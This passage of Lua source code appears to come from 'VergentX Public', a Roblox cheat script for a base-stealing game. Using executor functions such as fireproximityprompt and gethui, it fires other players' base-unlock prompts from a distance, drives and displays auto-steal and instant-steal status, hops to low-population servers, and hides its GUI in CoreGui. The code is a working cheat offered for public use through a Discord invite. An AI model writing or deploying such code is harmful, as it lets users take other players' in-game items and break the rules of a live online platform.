            local text = tostring(value)
            if text == "" then return false end
            for _, fn in ipairs({ setclipboard, toclipboard, setrbxclipboard }) do
                if typeof(fn) == "function" and pcall(fn, text) then return true end
            end
            return false
        end

        createSectionHeader(page, "SERVER INFO")
        createButtonRow(page, "Copy Job ID", "COPY", function(btn)
            local jobId = game.JobId
            if not jobId or jobId == "" then
                ShowNotification("Job ID", "No Job ID in this server")
                return
            end
            btn.Text = copyToClipboard(jobId) and "OK" or "FAIL"
            task.delay(0.8, function() if btn and btn.Parent then btn.Text = "COPY" end end)
        end)
        createButtonRow(page, "Copy Place ID", "COPY", function(btn)
            btn.Text = copyToClipboard(game.PlaceId) and "OK" or "FAIL"
            task.delay(0.8, function() if btn and btn.Parent then btn.Text = "COPY" end end)
        end)
        createButtonRow(page, "Copy Join Script", "COPY", function(btn)
            local joinScript = string.format(
                "game:GetService(\"TeleportService\"):TeleportToPlaceInstance(%d, \"%s\", game.Players.LocalPlayer)",
                game.PlaceId, tostring(game.JobId))
            btn.Text = copyToClipboard(joinScript) and "OK" or "FAIL"
            task.delay(0.8, function() if btn and btn.Parent then btn.Text = "COPY" end end)
        end)

        createSectionHeader(page, "SERVER FINDER")
        createSliderRow(page, "Max Players", 1, 20, CONFIG.HOP_MAX_PLAYERS or 2, "p", function(v)
            CONFIG.HOP_MAX_PLAYERS = math.floor(v + 0.5)
            saveConfig()
        end, 1)

        do
            local searching = false
            createButtonRow(page, "Find Low Server", "JOIN", function(btn)
                if searching then return end
                searching = true
                btn.Text = "..."
                local maxPlayers = tonumber(CONFIG.HOP_MAX_PLAYERS) or 2
                local server = findLowPlayerServer(maxPlayers, function(msg)
                    ShowNotification("Server Finder", msg)
                end)
                if server then
                    ShowNotification("Server Finder", "Joining a " .. tostring(server.playing) .. " player server")
                    btn.Text = "GO"
                    pcall(function()
                        TeleportService:TeleportToPlaceInstance(game.PlaceId, server.id, LP)
                    end)
                else
                    ShowNotification("Server Finder", "No server under " .. tostring(maxPlayers) .. " players")
                end
                task.delay(1.2, function()
                    if btn and btn.Parent then btn.Text = "JOIN" end
                    searching = false
                end)
            end)
        end
        createButtonRow(page, "Rejoin Server", "REJOIN", function(btn)
            btn.Text = "..."
            local ok = pcall(function()
                TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId, LP)
            end)
            if not ok then
                ShowNotification("Rejoin", "Teleport failed")
                btn.Text = "REJOIN"
            end
        end)

        createSectionHeader(page, "ABOUT")
        createButtonRow(page, "Discord  \u{00B7}  discord.gg/vergent", "COPY", function(btn)
            btn.Text = copyToClipboard("discord.gg/vergent") and "OK" or "FAIL"
            task.delay(0.8, function() if btn and btn.Parent then btn.Text = "COPY" end end)
        end)
        createResetConfigRow(page)
    end

    setActiveTab("Player")
end

local function CreateStatusHub()
    local existing = VXGui:FindFirstChild(_vxName("VergentXStatusHUD"))
    if existing then existing:Destroy() end

    local gui = Instance.new("ScreenGui")
    gui.Name = _vxName("VergentXStatusHUD")
    gui.DisplayOrder = 50000
    gui.ResetOnSpawn = false
    gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    gui.Enabled = true
    mountGui(gui)

    local HUD_H = 50 * MOBILE_SCALE
    local HUD_W = 476 * MOBILE_SCALE
    local BTN = 32 * MOBILE_SCALE
    local BTN_GAP = 14 * MOBILE_SCALE
    local UNLOCK_H = 46 * MOBILE_SCALE
    local UNLOCK_ROW = (BTN * 3) + (BTN_GAP * 2)
    local UNLOCK_W = UNLOCK_ROW + 22 * MOBILE_SCALE
    local UNLOCK_X = (UNLOCK_W - UNLOCK_ROW) / 2
    local STATS_W = 108 * MOBILE_SCALE
    local PAD = 18 * MOBILE_SCALE
    local MIN_GAP = 10 * MOBILE_SCALE

    local mainContainer = Instance.new("Frame", gui)
    mainContainer.Name = "VergentX_MainContainer"
    mainContainer.Size = UDim2.new(0, HUD_W, 0, HUD_H + UNLOCK_H + 8 * MOBILE_SCALE)
    mainContainer.AnchorPoint = Vector2.new(0.5, 0)
    _vxApplySavedPos(mainContainer, "HUB_POS", 0.5, 0.08)
    mainContainer.BackgroundTransparency = 1
    VergentXRegisterScale(Instance.new("UIScale", mainContainer), 1)

    local main = Instance.new("Frame", mainContainer)
    main.Name = "VergentX_Main"
    main.Size = UDim2.new(1, 0, 0, HUD_H)
    main.BorderSizePixel = 0
    main.Active = true
    local mainGrad = applyMarble(main)
    mainGrad.Rotation = 0
    main.BackgroundTransparency = 0
    Instance.new("UICorner", main).CornerRadius = UDim.new(0, 22 * MOBILE_SCALE)

    local mainBorder = Instance.new("UIStroke", main)
    mainBorder.Thickness = 0.8
    mainBorder.Transparency = 0.35
    mainBorder.Color = Color3.fromRGB(6, 6, 8)
    mainBorder.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
    gradient(mainBorder, RING_SEQ, 25)

    MakeDraggable(main, mainContainer, "HUB_POS")

    local container = Instance.new("Frame", main)
    container.Size = UDim2.new(1, -PAD * 2, 1, 0)
    container.Position = UDim2.new(0, PAD, 0, 0)
    container.BackgroundTransparency = 1

    local title = Instance.new("TextLabel", container)
    title.RichText = true
    title.Text = '<font color="#C9CCD3">Vergent</font><font color="#C49A3E">X</font><font color="#9EA1A8"> Public</font>'
    title.Font = Enum.Font.Gotham
    title.TextSize = math.floor(21 * MOBILE_SCALE + 0.5)
    title.TextColor3 = Color3.fromRGB(255, 255, 255)
    title.BackgroundTransparency = 1
    title.Size = UDim2.new(0, 150 * MOBILE_SCALE, 1, 0)
    title.Position = UDim2.new(0, 0, 0, 0)
    title.TextXAlignment = Enum.TextXAlignment.Left
    title.TextYAlignment = Enum.TextYAlignment.Center
    title.TextStrokeTransparency = 1
    textShine(title)

    local discordLink = Instance.new("TextLabel", container)
    discordLink.Size = UDim2.new(0, 150 * MOBILE_SCALE, 1, 0)
    discordLink.BackgroundTransparency = 1
    discordLink.Text = "discord.gg/vergent"
    discordLink.Font = Enum.Font.Gotham
    discordLink.TextSize = math.floor(13 * MOBILE_SCALE + 0.5)
    discordLink.TextColor3 = Color3.fromRGB(204, 166, 78)
    discordLink.TextXAlignment = Enum.TextXAlignment.Center
    discordLink.TextYAlignment = Enum.TextYAlignment.Center
    discordLink.TextStrokeTransparency = 1
    discordLink.TextTruncate = Enum.TextTruncate.AtEnd

    local unlockHolder = Instance.new("Frame", mainContainer)
    unlockHolder.Name = "VergentX_UnlockButtonsContainer"
    unlockHolder.Size = UDim2.new(0, UNLOCK_W, 0, UNLOCK_H)
    unlockHolder.Position = UDim2.new(0.5, -UNLOCK_W / 2, 0, HUD_H + 8 * MOBILE_SCALE)
    unlockHolder.BackgroundTransparency = 1
    Instance.new("UICorner", unlockHolder).CornerRadius = UDim.new(0, 10 * MOBILE_SCALE)

    local unlockBg = Instance.new("Frame", unlockHolder)
    unlockBg.Size = UDim2.new(1, 0, 1, 0)
    local unlockGrad = applyMarble(unlockBg)
    unlockGrad.Rotation = 0
    unlockBg.BackgroundTransparency = 0
    unlockBg.BorderSizePixel = 0
    Instance.new("UICorner", unlockBg).CornerRadius = UDim.new(0, 10 * MOBILE_SCALE)

    local unlockBorder = Instance.new("UIStroke", unlockHolder)
    unlockBorder.Thickness = 1.5 * MOBILE_SCALE
    unlockBorder.Transparency = 0.4
    unlockBorder.Color = Color3.fromRGB(6, 6, 8)
    unlockBorder.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
    gradient(unlockBorder, RING_SEQ, 25)

    local stats = Instance.new("TextLabel", container)
    stats.Size = UDim2.new(0, STATS_W, 1, 0)
    stats.Position = UDim2.new(1, -STATS_W, 0, 0)
    stats.BackgroundTransparency = 1
    stats.Font = Enum.Font.Gotham
    stats.TextSize = math.floor(13 * MOBILE_SCALE + 0.5)
    stats.TextXAlignment = Enum.TextXAlignment.Right
    stats.TextYAlignment = Enum.TextYAlignment.Center
    stats.TextColor3 = Theme.TextPrimary
    stats.RichText = true
    stats.TextStrokeTransparency = 1
    stats.Text = "<font color='#8F929A'>\u{2014} fps | \u{2014} ms</font>"

    local function plotOwnerName(plot)
        if not plot then return "Unknown" end
        local byScanner = Brainrots.OwnerOf and Brainrots.OwnerOf(plot.Name) or nil
        if byScanner then return byScanner end
        local ok, name = pcall(function()
            local sign = plot:FindFirstChild("PlotSign")
            if not sign then return nil end
            for _, d in ipairs(sign:GetDescendants()) do
                if d:IsA("TextLabel") and type(d.Text) == "string" and d.Text ~= "" then
                    local t = d.Text
                    if not t:lower():find("base") and #t < 30 then return t end
                end
            end
            return nil
        end)
        return (ok and name) or "Unknown"
    end

    local function findClosestUnlockAtLevel(targetLevel)
        local character = LP.Character
        local hrp = character and character:FindFirstChild("HumanoidRootPart")
        local plots = Workspace:FindFirstChild("Plots")
        if not hrp or not plots then return nil, nil, nil end

        local targetY
        if targetLevel == 1 then targetY = -2
        elseif targetLevel == 2 then targetY = 15
        elseif targetLevel == 3 then targetY = 27 end
        if not targetY then return nil, nil, nil end

        local closestPrompt, closestDist, closestPlot = nil, math.huge, nil
        for _, plot in ipairs(plots:GetChildren()) do
            local unlockFolder = plot:FindFirstChild("Unlock")
            if unlockFolder then
                for _, item in ipairs(unlockFolder:GetChildren()) do
                    local part, pos
                    if item:IsA("Model") then
                        pcall(function() pos = item:GetPivot().Position end)
                        part = item:FindFirstChildWhichIsA("BasePart", true)
                    elseif item:IsA("BasePart") then
                        pos = item.Position
                        part = item
                    end
                    if pos and part and math.abs(pos.Y - targetY) < 5 then
                        for _, desc in ipairs(part:GetDescendants()) do
                            if desc:IsA("ProximityPrompt") and desc.Enabled then
                                local dist = (hrp.Position - pos).Magnitude
                                if dist < closestDist then
                                    closestDist, closestPrompt, closestPlot = dist, desc, plot
                                end
                                break
                            end
                        end
                    end
                end
            end
        end
        return closestPrompt, closestDist, closestPlot
    end

    local unlockFire = {}
    for i = 1, 3 do
        local btn = Instance.new("TextButton", unlockHolder)
        btn.Name = "VergentX_UnlockBtn_" .. i
        btn.Size = UDim2.new(0, BTN, 0, BTN)
        btn.Position = UDim2.new(0, UNLOCK_X + ((i - 1) * (BTN + BTN_GAP)), 0.5, -BTN / 2)
        btn.AutoButtonColor = false
        btn.BackgroundColor3 = Color3.fromRGB(16, 16, 19)
        btn.BackgroundTransparency = 0.32
        btn.Text = tostring(i)
        btn.TextSize = math.floor(13 * MOBILE_SCALE + 0.5)
        btn.TextColor3 = Color3.fromRGB(224, 225, 229)
        btn.Font = Enum.Font.Gotham
        btn.TextStrokeTransparency = 1
        btn.BorderSizePixel = 0
        btn.ZIndex = 4
        Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 8 * MOBILE_SCALE)
        textShine(btn)

        local btnStroke = Instance.new("UIStroke", btn)
        btnStroke.Color = Color3.fromRGB(6, 6, 8)
        btnStroke.Thickness = 0.5
        btnStroke.Transparency = 0.5
        btnStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border

        btn.MouseEnter:Connect(function()
            TweenService:Create(btn, TweenInfo.new(0.18), { BackgroundTransparency = 0.55 }):Play()
            TweenService:Create(btnStroke, TweenInfo.new(0.18), { Transparency = 0.2 }):Play()
        end)
        btn.MouseLeave:Connect(function()
            TweenService:Create(btn, TweenInfo.new(0.18), { BackgroundTransparency = 0.32 }):Play()
            TweenService:Create(btnStroke, TweenInfo.new(0.18), { Transparency = 0.5 }):Play()
        end)

        local function fire()
            local foundPrompt, distance, foundPlot = findClosestUnlockAtLevel(i)
            if not foundPrompt then
                ShowNotification("Unlock", "No level " .. i .. " unlock found")
                return
            end
            TweenService:Create(btnStroke, TweenInfo.new(0.1), { Color = Theme.Success }):Play()
            task.delay(0.25, function()
                if btnStroke and btnStroke.Parent then
                    TweenService:Create(btnStroke, TweenInfo.new(0.15), { Color = Color3.fromRGB(6, 6, 8) }):Play()
                end
            end)
            local levelName = (i == 1 and "Basement") or (i == 2 and "Main") or "Roof"
            local ok = false
            if fireproximityprompt then ok = pcall(fireproximityprompt, foundPrompt) end
            if not ok then
                pcall(function()
                    foundPrompt:InputHoldBegin()
                    task.wait(0.05)
                    foundPrompt:InputHoldEnd()
                end)
            end
            ShowNotification("Unlock", levelName .. " - " .. plotOwnerName(foundPlot)
                .. " (" .. math.floor(distance or 0) .. "s)")
        end
        btn.MouseButton1Click:Connect(fire)
        unlockFire[i] = fire
    end
    _G.VXUnlockAtLevel = function(i)
        local fn = unlockFire[i]
        if fn then fn() end
    end

    local function layoutHud()
        local sc = mainContainer:FindFirstChildOfClass("UIScale")
        local f = (sc and sc.Scale > 0) and sc.Scale or 1
        local cw = container.AbsoluteSize.X / f
        if cw <= 0 then return end

        local tW = title.TextBounds.X / f
        if tW <= 0 then tW = 150 * MOBILE_SCALE end
        title.Size = UDim2.new(0, tW, 1, 0)

        local linkX = tW + MIN_GAP
        local linkW = (cw - STATS_W - MIN_GAP) - linkX
        if linkW < 0 then linkW = 0 end
        discordLink.Position = UDim2.new(0, linkX, 0, 0)
        discordLink.Size = UDim2.new(0, linkW, 1, 0)
        discordLink.Visible = linkW > 40 * MOBILE_SCALE
    end
    container:GetPropertyChangedSignal("AbsoluteSize"):Connect(layoutHud)
    title:GetPropertyChangedSignal("TextBounds"):Connect(layoutHud)
    discordLink:GetPropertyChangedSignal("TextBounds"):Connect(layoutHud)
    task.defer(layoutHud)

    local acc = 0
    vxBind(RunService.Heartbeat, function(dt)
        acc = acc + dt
        if acc < 1 then return end
        acc = 0
        local fps = math.floor(1 / math.max(dt, 1e-6))
        local ping = math.floor(LP:GetNetworkPing() * 1000)
        local fc = (fps >= 50) and "#7CE8A2" or (fps >= 30) and "#FFD37A" or "#FF7A8A"
        local pc = (ping < 100) and "#7CE8A2" or (ping < 200) and "#FFD37A" or "#FF7A8A"
        stats.Text = string.format(
            "<font color='%s'>%d fps</font> <font color='#8F929A'>|</font> <font color='%s'>%dms</font>",
            fc, fps, pc, ping)
    end)

    local Hub = {}
    function Hub.SetPosition(pos)
        if pos then mainContainer.Position = pos end
    end
    vxAttachReveal(gui, mainContainer)

    _G.VXStatusHub = Hub
    return Hub
end

local _VX_GEN_MULT = { k = 1e3, m = 1e6, b = 1e9, t = 1e12, qa = 1e15, q = 1e15 }

local function _vxParseGenText(txt)
    if not txt or txt == "" then return 0 end
    local body = txt:lower():gsub(",", "")
    local num, suf = body:match("([%d%.]+)%s*([kmbtqa]*)/s")
    if not num then
        num, suf = body:match("%$%s*([%d%.]+)%s*([kmbtqa]*)")
    end
    local n = tonumber(num)
    if not n then return 0 end
    if suf and suf ~= "" and _VX_GEN_MULT[suf] then n = n * _VX_GEN_MULT[suf] end
    return n
end

local _vxGenCache, _vxGenCacheAt = {}, {}
local _VX_GEN_HIT_TTL, _VX_GEN_MISS_TTL = 3, 1

local function VXReadPodiumGen(plotName, slot)
    local ck = tostring(plotName) .. "_" .. tostring(slot)
    local hit = _vxGenCache[ck]
    if hit ~= nil then
        local age = os.clock() - (_vxGenCacheAt[ck] or 0)
        if hit == false then
            if age < _VX_GEN_MISS_TTL then return nil, 0 end
        elseif age < _VX_GEN_HIT_TTL then
            return hit[1], hit[2]
        end
    end

    local function miss()
        _vxGenCache[ck] = false
        _vxGenCacheAt[ck] = os.clock()
        return nil, 0
    end

    local plots = Workspace:FindFirstChild("Plots")
    local plot = plots and plots:FindFirstChild(tostring(plotName))
    if not plot then return miss() end
    local podiums = plot:FindFirstChild("AnimalPodiums")
    local podium = podiums and podiums:FindFirstChild(tostring(slot))
    if not podium then return miss() end

    local bestText, bestVal = nil, 0
    local function scanFor(root)
        if not root then return end
        for _, d in ipairs(root:GetDescendants()) do
            if (d:IsA("TextLabel") or d:IsA("TextButton")) and type(d.Text) == "string" then
                local t = d.Text
                if (t:find("/s") or t:find("%$")) and t:find("%d") and not t:find(":") then
                    local v = _vxParseGenText(t)
                    if v > bestVal then bestVal = v; bestText = t end
                end
            end
        end
    end

    local ok = pcall(function()
        scanFor(podium)
        if bestVal == 0 then
            local base = podium:FindFirstChild("Base") or podium
            local basePart = base:IsA("BasePart") and base or base:FindFirstChildWhichIsA("BasePart", true)
            if basePart then
                local bp = basePart.Position
                for _, g in ipairs(plot:GetDescendants()) do
                    if g:IsA("BillboardGui") then
                        local an = g.Adornee or g.Parent
                        if an and an:IsA("BasePart") and (an.Position - bp).Magnitude < 10 then
                            scanFor(g)
                        end
                    end
                end
            end
        end
    end)
    if not ok then return miss() end

    if bestText and bestVal > 0 then
        _vxGenCache[ck] = { bestText, bestVal }
        _vxGenCacheAt[ck] = os.clock()
        return bestText, bestVal
    end
    return miss()
end
_G.VXReadPodiumGen = VXReadPodiumGen

local _vxGenByNameCache, _vxGenByNameAt = {}, {}

local function _vxGenByName(name)
    if type(name) ~= "string" or name == "" then return nil end

    local hit = _vxGenByNameCache[name]
    if hit ~= nil and (os.clock() - (_vxGenByNameAt[name] or 0)) < 5 then
        if hit == false then return nil end
        return hit
    end

    local out = nil
    local row = (_G.VXLastSeenRow and _G.VXLastSeenRow(name))
        or (_G.VXStaticRow and _G.VXStaticRow(name))
    if type(row) == "table" and type(row.genText) == "string" and row.genText ~= "" then
        out = row.genText
    elseif _G.VXBaseGenByName and Brainrots.GenText then
        local gv = _G.VXBaseGenByName(name)
        if gv then out = Brainrots.GenText(gv) end
    end

    _vxGenByNameCache[name] = out or false
    _vxGenByNameAt[name] = os.clock()
    return out
end

local function _vxGenLabelFor(entry, name)
    if type(entry) == "table" then
        if entry.plot and entry.slot then
            local txt, val = VXReadPodiumGen(entry.plot, entry.slot)
            if txt and val > 0 then
                local body = tostring(txt):gsub(",", "")
                local n, suf = body:match("([%d%.]+)%s*([kKmMbBtTqQaA]*)")
                if n then return "$" .. n .. (suf or "") .. "/s" end
                return tostring(txt)
            end
        end
        if type(entry.genText) == "string" and entry.genText ~= "" then return entry.genText end
        local byEntry = _vxGenByName(entry.name)
        if byEntry then return byEntry end
    end
    return _vxGenByName(name)
end

local function CreateStealBar()
    local gui = Instance.new("ScreenGui")
    gui.Name = _vxName("VergentXStealBar")
    gui.DisplayOrder = 50000
    gui.ResetOnSpawn = false
    gui.IgnoreGuiInset = true
    gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    gui.Enabled = true
    mountGui(gui)

    local function PX(v) return math.max(1, math.floor(v * MOBILE_SCALE + 0.5)) end

    local MINI_H = PX(55)
    local GAP = PX(10)

    local savedY = math.max(0, math.floor(tonumber(CONFIG.STEALBAR_Y) or 0))
    local manualOffset = (savedY > 0) and savedY or nil

    local stealMini = Instance.new("Frame", gui)
    stealMini.AnchorPoint = Vector2.new(0.5, 1)
    stealMini.Position = UDim2.new(0.5, 0, 1, -PX(120))
    stealMini.Size = UDim2.new(0, PX(390), 0, MINI_H)
    stealMini.BackgroundColor3 = Color3.fromRGB(12, 12, 14)
    stealMini.BackgroundTransparency = 0.06
    stealMini.BorderSizePixel = 0
    stealMini.ZIndex = 70
    Instance.new("UICorner", stealMini).CornerRadius = UDim.new(0, 9 * MOBILE_SCALE)

    local miniStroke = Instance.new("UIStroke", stealMini)
    miniStroke.Color = Color3.fromRGB(6, 6, 8)
    miniStroke.Thickness = 1
    miniStroke.Transparency = 0.55
    miniStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border

    local stealStatus = Instance.new("TextLabel", stealMini)
    stealStatus.Position = UDim2.new(0, 14 * MOBILE_SCALE, 0, 9 * MOBILE_SCALE)
    stealStatus.Size = UDim2.new(0.5, -14 * MOBILE_SCALE, 0, 15 * MOBILE_SCALE)
    stealStatus.BackgroundTransparency = 1
    stealStatus.Text = "IDLE"
    stealStatus.Font = Enum.Font.Gotham
    stealStatus.TextSize = 11 * MOBILE_SCALE
    stealStatus.TextColor3 = Color3.fromRGB(185, 186, 197)
    stealStatus.TextXAlignment = Enum.TextXAlignment.Left
    stealStatus.TextStrokeTransparency = 1

    local stealNameLbl = Instance.new("TextLabel", stealMini)
    stealNameLbl.Position = UDim2.new(0.34, 0, 0, 9 * MOBILE_SCALE)
    stealNameLbl.Size = UDim2.new(0.66, -14 * MOBILE_SCALE, 0, 15 * MOBILE_SCALE)
    stealNameLbl.BackgroundTransparency = 1
    stealNameLbl.Text = ""
    stealNameLbl.Font = Enum.Font.Gotham
    stealNameLbl.TextSize = 11 * MOBILE_SCALE
    stealNameLbl.TextColor3 = Color3.fromRGB(248, 249, 252)
    stealNameLbl.TextXAlignment = Enum.TextXAlignment.Right
    stealNameLbl.TextTruncate = Enum.TextTruncate.AtEnd
    stealNameLbl.TextStrokeTransparency = 1

    local stealTrack = Instance.new("Frame", stealMini)
    stealTrack.Position = UDim2.new(0, 14 * MOBILE_SCALE, 0, 32 * MOBILE_SCALE)
    stealTrack.Size = UDim2.new(1, -28 * MOBILE_SCALE, 0, 14 * MOBILE_SCALE)
    stealTrack.BackgroundColor3 = Color3.fromRGB(26, 26, 30)
    stealTrack.BorderSizePixel = 0
    Instance.new("UICorner", stealTrack).CornerRadius = UDim.new(0, 6 * MOBILE_SCALE)

    local trackStroke = Instance.new("UIStroke", stealTrack)
    trackStroke.Color = Color3.fromRGB(8, 8, 10)
    trackStroke.Thickness = 1
    trackStroke.Transparency = 0.35
    trackStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border

    local stealFill = Instance.new("Frame", stealTrack)
    stealFill.Size = UDim2.new(0, 0, 1, 0)
    stealFill.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    stealFill.BorderSizePixel = 0
    Instance.new("UICorner", stealFill).CornerRadius = UDim.new(0, 7 * MOBILE_SCALE)
    gradient(stealFill, ColorSequence.new({
        ColorSequenceKeypoint.new(0, Theme.SilverHi),
        ColorSequenceKeypoint.new(0.5, Theme.GoldHi),
        ColorSequenceKeypoint.new(1, Theme.GoldLo),
    }), 0)

    do
        local lastOffset = nil
        local cachedHotbar = nil

        local function guiRoots()
            local roots = {}
            pcall(function()
                local cg = game:GetService("CoreGui")
                if cg then roots[#roots + 1] = cg end
            end)
            pcall(function()
                if typeof(gethui) == "function" then
                    local h = gethui()
                    if h then roots[#roots + 1] = h end
                end
            end)
            roots[#roots + 1] = PlayerGui
            return roots
        end

        local function findHotbar()
            if cachedHotbar and cachedHotbar.Parent and cachedHotbar.AbsoluteSize.Y > 0 then
                return cachedHotbar
            end
            cachedHotbar = nil

            for _, root in ipairs(guiRoots()) do
                pcall(function()
                    local rg = root:FindFirstChild("RobloxGui")
                    local bp = rg and rg:FindFirstChild("Backpack")
                    local hb = bp and bp:FindFirstChild("Hotbar")
                    if hb and hb:IsA("GuiObject") and hb.AbsoluteSize.Y > 0 then
                        cachedHotbar = hb
                    end
                end)
                if cachedHotbar then return cachedHotbar end

                pcall(function()
                    for _, d in ipairs(root:GetDescendants()) do
                        if d.Name == "Hotbar" and d:IsA("GuiObject")
                            and d.Visible and d.AbsoluteSize.Y > 0 then
                            cachedHotbar = d
                            break
                        end
                    end
                end)
                if cachedHotbar then return cachedHotbar end
            end
            return nil
        end

        local function hotbarTop()
            local hb = findHotbar()
            if not hb or not hb.Visible then return nil end

            local top = hb.AbsolutePosition.Y
            local slotTop = nil
            pcall(function()
                for _, d in ipairs(hb:GetDescendants()) do
                    if d:IsA("GuiObject") and d.Visible and d.AbsoluteSize.Y > 8 then
                        local y = d.AbsolutePosition.Y
                        if not slotTop or y < slotTop then slotTop = y end
                    end
                end
            end)
            if slotTop and slotTop > top then top = slotTop end

            _G.VXStealBarDebug = { name = hb.Name, frameTop = hb.AbsolutePosition.Y, usedTop = top }
            return top
        end

        local function apply(offset)
            local want = math.floor(offset + 0.5)
            if want ~= lastOffset then
                lastOffset = want
                stealMini.Position = UDim2.new(0.5, 0, 1, -want)
            end
        end

        local function place()
            local cam = Workspace.CurrentCamera
            local vh = cam and cam.ViewportSize.Y or 0
            if vh <= 0 then return end

            if manualOffset then
                apply(math.clamp(manualOffset, 0, math.max(0, vh - MINI_H)))
                return
            end

            local fromBottom
            local top = hotbarTop()
            if top and top > 0 and top < vh then
                fromBottom = vh - top
            else
                fromBottom = math.max(PX(80), vh * 0.1)
                _G.VXStealBarDebug = { name = "fallback", vh = vh }
            end
            fromBottom = math.clamp(fromBottom, 0, vh * 0.4)

            local want = math.floor(fromBottom + GAP + 0.5)
            if want ~= lastOffset then
                lastOffset = want
                stealMini.Position = UDim2.new(0.5, 0, 1, -want)
            end
        end

        place()
        task.spawn(function()
            while vxAlive() do
                task.wait(1)
                pcall(place)
            end
        end)
    end

    do
        local dragging, dragStartY, startOffset = false, 0, 0

        stealMini.Active = true

        stealMini.InputBegan:Connect(function(input)
            if _G.VXGuiLocked == true then return end
            if input.UserInputType == Enum.UserInputType.MouseButton1
                or input.UserInputType == Enum.UserInputType.Touch then
                dragging = true
                dragStartY = input.Position.Y
                startOffset = -stealMini.Position.Y.Offset
                local conn
                conn = input.Changed:Connect(function()
                    if input.UserInputState == Enum.UserInputState.End then
                        dragging = false
                        if conn then conn:Disconnect() end
                        if manualOffset then
                            CONFIG.STEALBAR_Y = manualOffset
                            saveConfig()
                        end
                    end
                end)
            end
        end)

        vxBind(UserInputService.InputChanged, function(input)
            if not dragging or _G.VXGuiLocked == true then return end
            if input.UserInputType ~= Enum.UserInputType.MouseMovement
                and input.UserInputType ~= Enum.UserInputType.Touch then return end

            local cam = Workspace.CurrentCamera
            local vh = cam and cam.ViewportSize.Y or 0
            local want = startOffset - (input.Position.Y - dragStartY)
            if vh > 0 then want = math.clamp(want, 0, vh - MINI_H) end

            manualOffset = math.floor(want + 0.5)
            stealMini.Position = UDim2.new(0.5, 0, 1, -manualOffset)
        end)
    end

    do
        local pickAcc = 0
        vxBind(RunService.Heartbeat, function(dt)
            if StealState.active and StealState.entry then return end
            pickAcc = pickAcc + dt
            if pickAcc < 0.2 then return end
            pickAcc = 0
            local pick = Brainrots.Nearest()
            _G.VXSelectedBrainrot = pick
        end)
    end

    do
        local lastPhase, lastPct, lastName
        local FILL_TIME = 0.28
        local fillTween, lastCycleStamp = nil, nil

        local function playFill()
            if fillTween then
                fillTween:Cancel()
                fillTween = nil
            end
            stealFill.Size = UDim2.new(0, 0, 1, 0)
            fillTween = TweenService:Create(
                stealFill,
                TweenInfo.new(FILL_TIME, Enum.EasingStyle.Quint, Enum.EasingDirection.Out),
                { Size = UDim2.new(1, 0, 1, 0) }
            )
            fillTween:Play()
        end

        local nameAcc = 0

        vxBind(RunService.Heartbeat, function(dt)
            local progress = Steal.Progress and Steal.Progress() or 0

            local instState = _G.VXInstantState

            local instActive = CONFIG.INSTANT_STEAL and instState and instState.stealing
            local carrying = LP:GetAttribute("Stealing") == true

            local phase
            if StealState.active or instActive then phase = "STEALING"
            elseif carrying then phase = "CARRYING"
            elseif CONFIG.AUTO_STEAL or CONFIG.INSTANT_STEAL then phase = "SCANNING"
            else phase = "IDLE" end

            nameAcc = nameAcc + dt
            if nameAcc >= 0.1 or phase ~= lastPhase then
                nameAcc = 0

                local target = StealState.entry
                    or (instState and instState.entry)
                    or _G.VXSelectedBrainrot

                local instNm = instState and (instState.targetName or instState.target)
                if instNm == "" then instNm = nil end

                local autoNm = StealState.label
                if autoNm == "" then autoNm = nil end

                local entryNm = target and tostring(target.name or "")
                if entryNm == "" then entryNm = nil end

                local nm = instNm or entryNm or autoNm or ""
                if nm ~= "" then
                    local gen = _vxGenLabelFor(target, nm)
                    if gen then nm = nm .. "  \u{00B7}  " .. gen end
                end
                if nm ~= lastName then
                    lastName = nm
                    stealNameLbl.Text = nm
                end
            end

            if phase ~= lastPhase then
                lastPhase = phase
                local statusCol, nameCol
                if phase == "STEALING" then
                    stealStatus.Text = "STEALING"
                    statusCol = Color3.fromRGB(80, 235, 140)
                    nameCol   = Color3.fromRGB(248, 249, 252)
                elseif phase == "CARRYING" then
                    stealStatus.Text = "CARRYING"
                    statusCol = Color3.fromRGB(255, 196, 62)
                    nameCol   = Color3.fromRGB(248, 249, 252)
                elseif phase == "SCANNING" then
                    stealStatus.Text = "SCANNING"
                    statusCol = Color3.fromRGB(204, 164, 72)
                    nameCol   = Color3.fromRGB(214, 217, 224)
                else
                    stealStatus.Text = "IDLE"
                    statusCol = Color3.fromRGB(255, 150, 60)
                    nameCol   = Color3.fromRGB(214, 217, 224)
                end
                local ti = TweenInfo.new(0.22, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
                TweenService:Create(stealStatus, ti, { TextColor3 = statusCol }):Play()
                TweenService:Create(stealNameLbl, ti, { TextColor3 = nameCol }):Play()
            end

            if CONFIG.INSTANT_STEAL and instState then
                local stamp = instState.lastResetAt
                if stamp and stamp ~= lastCycleStamp then
                    lastCycleStamp = stamp
                    playFill()
                end
                lastPct = nil
            else
                lastCycleStamp = nil
                local shown = math.clamp(progress, 0, 1)
                if shown ~= lastPct then
                    lastPct = shown
                    if fillTween then
                        fillTween:Cancel()
                        fillTween = nil
                    end
                    stealFill.Size = UDim2.new(shown, 0, 1, 0)
                end
            end
        end)
    end

    local Bar = {}
    function Bar.SetVisible() end
    function Bar.IsVisible() return true end
    function Bar.SetPosition() end

    _G.VXStealBar = Bar
    return Bar
end

local function CreateCooldownPanel()
    local gui = Instance.new("ScreenGui")
    gui.Name = _vxName("VergentXCmdPanel")
    gui.DisplayOrder = 50000
    gui.ResetOnSpawn = false
    gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    gui.Enabled = CONFIG.CMD_PANEL == true
    mountGui(gui)

    local cmds = AP.Commands or {}
    local ROW_H = 34 * MOBILE_SCALE
    local PAD = 6 * MOBILE_SCALE
    local HDR_H = 33 * MOBILE_SCALE
    local WIDTH = 300 * MOBILE_SCALE
    local HEIGHT = HDR_H + 16 * MOBILE_SCALE + (#cmds * (ROW_H + PAD))

    local mainFrame = Instance.new("Frame")
    mainFrame.Size = UDim2.new(0, WIDTH, 0, HEIGHT)
